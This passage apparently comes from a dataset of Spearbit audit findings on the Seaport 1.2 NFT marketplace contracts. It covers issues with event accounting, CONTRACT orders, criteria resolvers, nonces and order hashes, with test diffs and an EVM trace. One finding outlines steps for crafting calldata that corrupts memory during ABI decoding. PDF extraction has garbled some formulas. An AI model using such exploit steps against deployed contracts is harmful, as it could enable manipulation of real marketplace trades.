fraction of the order. consideration item's recipient offer item. consideration item. The SpentItems and ReceivedItem items provided to OrderFulfilled event ignore the last component of the offer/consideration items in the above form since they are redundant. Seaport enforces that all consideration items are used. But for the endpoints in this context, we might end up with offer items with only a portion of their amounts being spent. So in the end O.acurr might not be the amount spent for this offer item, but OrderFulfilled emits O.acurr as the amount spent. This can cause discrepancies in off-chain bookkeeping by agents listening for this event. The fulfillOrder and fulfillAdvancedOrder do not have this issue, since all items are enforced to be used. These two endpoints also differ from when there are collections of (advanced) orders, in that they would emit the OrderFulfilled at the of their call before clearing the reentrancy guard.", "labels": ["Spearbit", "Seaport", "Severity: Medium Risk"]}, {"title": "The spent offer item amounts shared with a zone for restricted (advanced) orders or with a contract offerer for orders of CONTRACT order type is not the actual spent amount in general", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When Seaport is called to fulfill or match a collection of (advanced) orders, there are scenarios where not all offer items will be used. When not all the current amount of an offer item is used and if this offer item belongs to an order which is of either CONTRACT order type or it is restricted order (and the caller is not the zone), then the spent amount shared with either the contract offerer or zone through their respective endpoints (validateOrder for zones and ratifyOrder for contract offerers) does not reflect the actual amount spent. When Seaport is called through one of its more complex endpoints to match or fulfill orders, the offer items go through a few phases: parameter description It T i as ae acurr O itemType token identifier startAmount endAmount the interpolation of startAmount and endAmount depending on the time and the fraction of the order. offer item.  Let's assume an offer item is originally O = (It , T , i, as, ae)  In _validateOrdersAndPrepareToFulfill, O gets transformed into (It , T , i, acurr , acurr )  Then depending on whether the order is part of a match (1, 2. 3) or fulfillment (1, 2) order and there is a corresponding fulfillment data pointing at this offer item, it might transform into (It , T , i, b, acurr ) where b 2 [0, 1). For fulfilling a collection of orders b 2 {0, acurr } depending on whether the offer item gets used or not, but for match orders, it can be in the more general range of b 2 [0, 1).  And finally for restricted or CONTRACT order types before calling _assertRestrictedAdvancedOrderValidity, the offer item would be transformed into (It , T , i, acurr , acurr ). So the startAmount of an offer item goes through the following flow: as ! acurr ! b 2 [0, 1) ! acurr 7 And at the end acurr is the amount used when Seaport calls into the validateOrder of a zone or ratifyOrder of a contract offerer. acurr does not reflect the actual amount that this offer item has contributed to a combined amount used for an execution transfer.", "labels": ["Spearbit", "Seaport", "Severity: Medium Risk"]}, {"title": "Empty criteriaResolvers for criteria-based contract orders", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "There is a deviation in how criteria-based items are resolved for contract orders. For contract orders which have offers with criteria, the _compareItems function checks that the contract offerer returned a corresponding non-criteria based itemType when identifierOrCriteria for the original item is 0, i.e., offering from an entire collection. Afterwards, the orderParameters.offer array is replaced by the offer array returned by the contract offerer. For other criteria-based orders such as offers with identifierOrCriteria = 0, the itemType of the order is only updated during the criteria resolution step. This means that for such offers there should be a corresponding CriteriaResolver struct. See the following test: 8 modified @@ -3568,9 +3568,8 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { test/advanced.spec.ts // Seller approves marketplace contract to transfer NFTs await set1155ApprovalForAll(seller, marketplaceContract.address, true); - - + const { root, proofs } = merkleTree([nftId]); const offer = [getTestItem1155WithCriteria(root, toBN(1), toBN(1))]; const offer = [getTestItem1155WithCriteria(toBN(0), toBN(1), toBN(1))]; const consideration = [ getItemETH(parseEther(\"10\"), parseEther(\"10\"), seller.address), @@ -3578,8 +3577,9 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { getItemETH(parseEther(\"1\"), parseEther(\"1\"), owner.address), ]; + - + // Replacing by `const criteriaResolvers = []` will revert const criteriaResolvers = [ buildResolver(0, 0, 0, nftId, proofs[nftId.toString()]), buildResolver(0, 0, 0, nftId, []), ]; const { order, orderHash, value } = await createOrder( However, in case of contract offers with identifierOrCriteria = 0, Seaport 1.2 does not expect a corresponding CriteriaResolver struct and will revert if one is provided as the itemType was updated to be the corresponding non-criteria based itemType. See advanced.spec.ts#L510 for a test case. Note: this also means that the fulfiller cannot explicitly provide the identifier when a contract order is being fulfilled. A malicious contract may use this to their advantage. For example, assume that a contract offerer in Seaport only accepts criteria-based offers. The fulfiller may first call previewOrder where the criteria is always resolved to a rare NFT, but the actual execution would return an uninteresting NFT. If such offers also required a corresponding resolver (similar behaviour as regular criteria based orders), then this could be fixed by explicitly providing the identifier--akin to a slippage check. In short, for regular criteria-based orders with identifierOrCriteria = 0 the fulfiller can pick which identifier to receive by providing a CriteriaResolver (as long as it's valid). For contract orders, fulfillers don't have this option and contracts may be able to abuse this.", "labels": ["Spearbit", "Seaport", "Severity: Medium Risk"]}, {"title": "Advance orders of CONTRACT order types can generate orders with less consideration items that would break the aggregation routine", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When Seaport gets a collection of advanced orders to fulfill or match, if one of the orders has a CON- TRACT order type, Seaport calls the generateOrder(...) endpoint of that order's offerer. generateOrder(...) can provide fewer consideration items for this order. So the total number of consideration items might be less than the ones provided by the caller. But since the caller would need to provide the fulfillment data beforehand to Seaport, they might use indices that would turn to be out of range for the consideration in question after the modification applied for the contract offerer above. If this happens, the whole call will be reverted. This issue is in the same category as Advance orders of CONTRACT order types can generate orders with different consideration recipients that would break the aggregation routine.", "labels": ["Spearbit", "Seaport", "Severity: Medium Risk"]}, {"title": "AdvancedOrder.numerator and AdvancedOrder.denominator are unchecked for orders of CONTRACT or- der type", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "For most advanced order types, we have the following check: // Read numerator and denominator from memory and place on the stack. uint256 numerator = uint256(advancedOrder.numerator); uint256 denominator = uint256(advancedOrder.denominator); // Ensure that the supplied numerator and denominator are valid. if (numerator > denominator || numerator == 0) { _revertBadFraction(); } For CONTRACT order types this check is skipped. For later calculations (calculating the current amount) Seaport uses the numerator and denominator returned by _getGeneratedOrder which as a pair it's either (1, 1) or (0, 0). advancedOrder.numerator is only used to skip certain operations in some loops when it is 0:  Skip applying criteria resolvers. 10  Skip aggregating the amount for executions.  Skip the final validity check. Skipping the above operations would make sense. But when for an advancedOrder with CONTRACT order type _get- GeneratedOrder returns (h, 1, 1) and advancedOrder.numerator == 0, we would skip applying criteria resolvers, aggregating the amounts from offer or consideration amounts for this order and skip the final validity check that would call into the ratifyOrder endpoint of the offerer. But emiting the following OrderFulfilled will not be skipped, even though this advancedOrder will not be used. // Emit an OrderFulfilled event. _emitOrderFulfilledEvent( orderHash, orderParameters.offerer, orderParameters.zone, recipient, orderParameters.offer, orderParameters.consideration ); This can create discrepancies between what happens on chain and what off-chain agents index/record.", "labels": ["Spearbit", "Seaport", "Severity: Medium Risk"]}, {"title": "Calls to PausableZone's executeMatchAdvancedOrders and executeMatchOrders would revert if un- used native tokens would need to be returned", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In match (advanced) orders, one can provide native tokens as offer and consideration items. So a PausableZone would need to provide msg.value to call the corresponding Seaport endpoints. There are a few scenarios where not all the msg.value native tokens amount provided to the Seaport marketplace will be used: 1. Rounding errors in calculating the current amount of offer or consideration items. The zone can prevent send- ing extra native tokens to Seaport by pre-calculating these values and making sure to have its transaction to be included in the specific block that these values were calculated for (this is important when the start and end amount of an item are not equal). 2. The zone (un)intentionally sends more native tokens that it is necessary to Seaport. 3. The (advanced) orders sent for matching in Seaport include order type of CONTRACT offerer order and the of- ferer contract provides different amount for at least one item that would eventually make the whole transaction not use the full amount of msg.value provided to it. In all these cases, since PausableZone does not have a receive or fallback endpoint to accept native tokens, when Seaport tries to send back the unsued native token amount the transaction may revert. PausableZone not accepting native tokens: $ export CODE=$(jq -r '.deployedBytecode' artifacts/contracts/zones/PausableZone.sol/PausableZone.json | tr -d '\\n') ,! $ evm --code $CODE --value 1 --prestate genesis.json --sender ,! 0xb4d0000000000000000000000000000000000000 --nomemory=false --debug run $ evm --input $(echo $CODE | head -c 44 - | sed -E s/0x//) disasm 6080806040526004908136101561001557600080fd 00000: PUSH1 0x80 00002: DUP1 00003: PUSH1 0x40 00005: MSTORE 00006: PUSH1 0x04 00008: SWAP1 00009: DUP2 0000a: CALLDATASIZE 0000b: LT 0000c: ISZERO 0000d: PUSH2 0x0015 00010: JUMPI 00011: PUSH1 0x00 00013: DUP1 00014: REVERT trace of evm ... --debug run error: execution reverted #### TRACE #### PUSH1 pc=00000000 gas=4700000 cost=3 DUP1 pc=00000002 gas=4699997 cost=3 12 Stack: 00000000 0x80 PUSH1 Stack: 00000000 00000001 MSTORE Stack: 00000000 00000001 00000002 PUSH1 Stack: 00000000 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 SWAP1 Stack: 00000000 00000001 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 DUP2 Stack: 00000000 00000001 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 pc=00000003 gas=4699994 cost=3 pc=00000005 gas=4699991 cost=12 pc=00000006 gas=4699979 cost=3 0x80 0x80 0x40 0x80 0x80 0x80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000008 gas=4699976 cost=3 0x4 0x80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000009 gas=4699973 cost=3 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000010 gas=4699970 cost=2 0x4 0x80 0x4 CALLDATASIZE Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| 13 LT Stack: 00000000 00000001 00000002 00000003 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 ISZERO Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 PUSH2 Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 JUMPI Stack: 00000000 00000001 00000002 00000003 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 PUSH1 Stack: 00000000 00000001 Memory: 00000000 00000010 00000020 pc=00000011 gas=4699968 cost=3 0x0 0x4 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000012 gas=4699965 cost=3 0x1 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000013 gas=4699962 cost=3 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000016 gas=4699959 cost=10 0x15 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000017 gas=4699949 cost=3 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 14 00000030 00000040 00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| DUP1 Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 REVERT Stack: 00000000 00000001 00000002 00000003 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 pc=00000019 gas=4699946 cost=3 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000020 gas=4699943 cost=0 0x0 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| #### LOGS #### genesis.json: { \"gasLimit\": \"4700000\", \"difficulty\": \"1\", \"alloc\": { \"0xb4d0000000000000000000000000000000000000\": { \"balance\": \"10000000000000000000000000\", \"code\": \"\", \"storage\": {} } } } // file: test/zone.spec.ts ... it(\"Fulfills an order with executeMatchAdvancedOrders with NATIVE Consideration Item\", async () => { const pausableZoneControllerFactory = await ethers.getContractFactory( \"PausableZoneController\", owner ); const pausableZoneController = await pausableZoneControllerFactory.deploy( owner.address ); // Deploy pausable zone const zoneAddr = await createZone(pausableZoneController); 15 // Mint NFTs for use in orders const nftId = await mintAndApprove721(seller, marketplaceContract.address); // Define orders const offerOne = [ getTestItem721(nftId, toBN(1), toBN(1), undefined, testERC721.address), ]; const considerationOne = [ getOfferOrConsiderationItem( 0, ethers.constants.AddressZero, toBN(0), parseEther(\"0.01\"), parseEther(\"0.01\"), seller.address ), ]; const { order: orderOne, orderHash: orderHashOne } = await createOrder( seller, zoneAddr, offerOne, considerationOne, 2 ); const offerTwo = [ getOfferOrConsiderationItem( 0, ethers.constants.AddressZero, toBN(0), parseEther(\"0.01\"), parseEther(\"0.01\"), undefined ), ]; const considerationTwo = [ getTestItem721( nftId, toBN(1), toBN(1), buyer.address, testERC721.address ), ]; const { order: orderTwo, orderHash: orderHashTwo } = await createOrder( buyer, zoneAddr, offerTwo, considerationTwo, 2 ); const fulfillments = [ [[[0, 0]], [[1, 0]]], [[[1, 0]], [[0, 0]]], ].map(([offerArr, considerationArr]) => toFulfillment(offerArr, considerationArr) ); // Perform the match advanced orders with zone const tx = await pausableZoneController .connect(owner) 16 .executeMatchAdvancedOrders( zoneAddr, marketplaceContract.address, [orderOne, orderTwo], [], fulfillments, { value: parseEther(\"0.01\").add(1) } // the extra 1 wei reverts the tx ); // Decode all events and get the order hashes const orderFulfilledEvents = await decodeEvents(tx, [ { eventName: \"OrderFulfilled\", contract: marketplaceContract }, ]); expect(orderFulfilledEvents.length).to.equal(fulfillments.length); // Check that the actual order hashes match those from the events, in order const actualOrderHashes = [orderHashOne, orderHashTwo]; orderFulfilledEvents.forEach((orderFulfilledEvent, i) => expect(orderFulfilledEvent.data.orderHash).to.be.equal( actualOrderHashes[i] ) ); }); ... This bug also applies to Seaport 1.1 and PausableZone (0x004C00500000aD104D7DBd00e3ae0A5C00560C00)", "labels": ["Spearbit", "Seaport", "Severity: Medium Risk"]}, {"title": "ABI decoding for bytes: memory can be corrupted by maliciously constructing the calldata", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In the code snippet below, size can be made 0 by maliciously crafting the calldata. In this case, the free memory is not incremented. assembly { mPtrLength := mload(0x40) let size := and( add( and(calldataload(cdPtrLength), OffsetOrLengthMask), AlmostTwoWords ), OnlyFullWordMask ) calldatacopy(mPtrLength, cdPtrLength, size) mstore(0x40, add(mPtrLength, size)) } This has two different consequences: 1. If the memory offset mPtrLength is immediately used then junk values at that memory location can be interpreted as the decoded bytes type. In the case of Seaport 1.2, the likelihood of the current free memory pointing to junk value is low. So, this case has low severity. 17 2. The consequent memory allocation will also use the value mPtrLength to store data in memory. This can lead to corrupting the initial memory data. In the worst case, the next allocation can be tuned so that the first bytes data can be any arbitrary data. To make the size calculation return 0: 1. Find a function call which has bytes as a (nested) parameter. 2. Modify the calldata field where the length of the above byte is stored to the new length 0xffffe0. 3. The calculation will now return size = 0. Note: there is an additional requirement that this bytes type should be inside a dynamic struct. Otherwise, for example, in case of function foo(bytes calldata signature) , the compiler will insert a check that calldata- size is big enough to fit signature.length. Since the value 0xffffe0 is too big to be fit into calldata, such an attack is impractical. However, for bytes type inside a dynamic type, for example in function foo(bytes[] calldata signature), this check is skipped by solc (likely because it's expensive). For a practical exploit we need to look for such function. In case of Seaport 1.2 this could be the matchAdvancedOrders(AdvancedOrder[] calldata orders, ...) function. The struct AdvancedOrder has a nested parameter bytes signature as well as bytes extraData. In the above exploit one would be able to maliciously modify the calldata in such a way that Seaport would interpret the data in extraData as the signature. Here is a proof of concept for a simplified case that showcases injecting an arbitrary value into a decoded bytes. As for severity, even though interpreting calldata differently may not fundamentally break the protocol, an attacker with enough effort may be able to use this for subtle phishing attacks or as a precursor to other attacks.", "labels": ["Spearbit", "Seaport", "Severity: Medium Risk"]}, {"title": "Advance orders of CONTRACT order types can generate orders with different consideration recipients that would break the aggregation routine", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When Seaport receives a collection of advanced orders to match or fulfill, if one of the orders has a CONTRACT order type, Seaport calls the generateOrder(...) endpoint of that order's offerer. genera- teOrder(...) can provide new consideration item recipients for this order. These new recipients are going to be used for this order from this point on. In _getGeneratedOrder, there is no comparison between old or new consideration recipients. The provided new recipients can create an issue when aggregating consideration items. Since the fulfillment data is provided beforehand by the caller of the Seaport endpoint, the caller might have provided fulfillment aggregation data that would have aggregated/combined one of the consideration items of this changed advance order with another consideration item. But the aggregation had taken into consideration the original recipient of the order in question. Multiple consideration items can only be aggregated if they share the same itemType, token, identi- fier, and recipient (ref). The new recipients provided by the contract offerer can break this invariant and in turn cause a revert.", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "CriteriaResolvers.criteriaProof is not validated in the identifierOrCriteria == 0 case", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In the case of identifierOrCriteria == 0, the criteria resolver completely skips any validations on the Merkle proof and in particular is missing the validation that CriteriaResolvers.criteriaProof.length == 0. Note: This is also present in Seaport 1.1 and may be a known issue. Proof of concept: modified @@ -3568,9 +3568,8 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { test/advanced.spec.ts // Seller approves marketplace contract to transfer NFTs await set1155ApprovalForAll(seller, marketplaceContract.address, true); - - + const { root, proofs } = merkleTree([nftId]); const offer = [getTestItem1155WithCriteria(root, toBN(1), toBN(1))]; const offer = [getTestItem1155WithCriteria(toBN(0), toBN(1), toBN(1))]; const consideration = [ getItemETH(parseEther(\"10\"), parseEther(\"10\"), seller.address), @@ -3578,8 +3577,9 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { getItemETH(parseEther(\"1\"), parseEther(\"1\"), owner.address), ]; + - + // Add a junk criteria proof and the test still passes const criteriaResolvers = [ buildResolver(0, 0, 0, nftId, proofs[nftId.toString()]), buildResolver(0, 0, 0, nftId, ,! [\"0xdead000000000000000000000000000000000000000000000000000000000000\"]), ]; const { order, orderHash, value } = await createOrder(", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "Calls to TypehashDirectory will be successful", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "TypehashDirectory's deployed bytecode starts with 00 which corresponds to STOP opcode (SSTORE2 also uses this pattern). This choice for the 1st bytecode causes accidental calls to the contract to succeed silently.", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "_isValidBulkOrderSize does not perform the signature length validation correctly.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In _isValidBulkOrderSize the signature's length validation is performed as follows: let length := mload(signature) validLength := and( lt(length, BulkOrderProof_excessSize), lt(and(sub(length, BulkOrderProof_minSize), AlmostOneWord), 2) ) The sub opcode in the above snippet wraps around. If this was the correct formula then it would actually simplify to: lt(and(sub(length, 3), AlmostOneWord), 2) The simplified and the current version would allow length to also be 3, 4, 35, 36, 67, 68 but _isValidBulkOrder- Size actually needs to check that length ( l ) has the following form: where x 2 f0, 1g and y 2 f1, 2, (cid:1) (cid:1) (cid:1) , 24g ( y represents the height/depth of the bulk order).", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "When contractNonce occupies more than 12 bytes the truncated nonce shared back with the contract offerer through ratifyOrder would be smaller than the actual stored nonce", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When contractNonce occupies more than 12 bytes the truncated nonce shared back with the con- tract offerer through ratifyOrder would be smaller than the actual stored nonce: // Write contractNonce to calldata dstHead.offset(ratifyOrder_contractNonce_offset).write( uint96(uint256(orderHash)) ); This is due to the way the contractNonce and the offerer's address are mixed in the orderHash: assembly { orderHash := or(contractNonce, shl(0x60, offerer)) }", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "abi_decode_bytes does not mask the copied data length", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When abi_decode_bytes decodes bytes, it does not mask the copied length of the data in memory (other places where the length is masked by OffsetOrLengthMask).", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "OrderHash in the context of contract orders need not refer to a unique order", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In Seaport 1.1 and in Seaport 1.2 for non-contract orders, order hashes have a unique correspon- dence with the order, i.e., it can be used to identify the status of an order on-chain and track it. However, in case of contract orders, this is not the case. It is simply the current nonce of the offerer, combined with the address. This cannot be used to uniquely track an order on-chain. uint256 contractNonce; unchecked { contractNonce = _contractNonces[offerer]++; } assembly { orderHash := or(contractNonce, shl(0x60, offerer)) } Here are some example scenarios where this can be problematic: Scenario 1: A reverted contract order and the adjacent succeeding contract order will have the same order hash, regardless of whether they correspond to the same order. 1. Consider Alice calling fulfilledAdvancedOrder for a contract order with offerer = X, where X is a smart contract that offers contract orders on Seaport 1.2. Assume that this transaction failed because enough gas was not provided for the generateOrder call. This tx would revert with a custom error InvalidContrac- tOrder, generated from OrderValidator.sol#L391. 22 2. Consider Bob calling fulfilledAdvancedOrder for a different contract order with offerer = X, same smart contract offerer. OrderFulfiller.sol#L124 This order will succeed and emit the OrderFulfilled event the from In the above scenario, there are two different orders, one that reverted on-chain and the other that succeeded, both having the same orderHash despite the orders only sharing the same contract offerer--the other parameters can be completely arbitrary. Scenario 2: Contract order hashes computed off-chain can be misleading. 1. Consider Alice calling fulfilledAdvancedOrder for a contract order with offerer = X, where X is a smart contract that offers contract orders on Seaport 1.2. Alice computed the orderHash of their order off-chain by simulating the transaction, sends the transaction and polls the OrderFulfilled event with the same orderHash to know if the order has been fulfilled. 2. Consider Bob calling fulfilledAdvancedOrder for any contract order with offerer = X, the same smart contract offerer. 3. Bob's transaction gets included first. An OrderFulfilled event is emitted, with the orderHash to be the same hash that Alice computed off-chain! Alice may believe that their order succeeded. for non-contract Orders, the above approach would be valid, i.e., one may generate and sign an order, Note: compute the order hash of an order off-chain and poll for an OrderFulfilled with the order hash to know that it was fulfilled. Note: even though there is an easier way to track if the order succeeded in these cases, in the general case, Alice or Bob need not be the one executing the orders on-chain. And an off-chain agent may send misleading notifications to either parties that their order succeeded due to this quirk with contract order hashes.", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "When _contractNonces[offerer] gets updated no event is emitted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When _contractNonces[offerer] gets updated no event is emitted. This is in contrast to when a counter is updated. One might be able to extract the _contractNonces[offerer] (if it doesn't overflow 12 bytes to enter into the offerer region in the orderhash) from a later event when OrderFulfilled gets emited. OrderFulfilled only gets emitted for an order of CONTRACT type if the generateOrder(...)'s return data satisffies all the constraints.", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}]